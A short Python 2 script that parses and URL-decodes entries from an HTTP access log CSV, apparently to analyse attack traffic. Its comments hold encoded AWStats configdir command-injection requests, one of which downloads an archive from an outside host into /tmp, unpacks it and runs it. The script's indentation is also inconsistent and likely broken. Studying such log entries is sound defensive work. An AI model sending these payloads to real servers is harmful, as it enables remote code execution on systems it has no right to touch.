import re
import csv
import urllib

file="/home/hduser/Desktop/normailized_log/http_access_export.csv"
# data = ['/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bwget%20www%2eadjud%2ego%2ero%2ft%2etgz%3btar%20zxvf%20t%2etgz%3b%2e%2ft%3becho%20e_exp%3b%2500',
# '/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500']
# data = ['212.203.66.69', 'Feb 26', '22:12:22', '500', 'GET', '/cgi bin/awstats.pl?configdir=%7cecho%20%3becho%20b_exp%3bcd%20%2ftmp%3bls%20%2dal%3becho%20e_exp%3b%2500', 'HTTP/1.1', '200', '961']

with open(file, 'rb') as f:
    reader = csv.reader(f)
    datalist = map(tuple, reader)
    
    dataset = []
    for sublist in datalist:
        sublist = map(lambda item: item.strip(''), sublist)
        data = [i.split(';') for i in sublist][0]


		datalist = map(lambda item: urllib.unquote(item), data)
		print datalist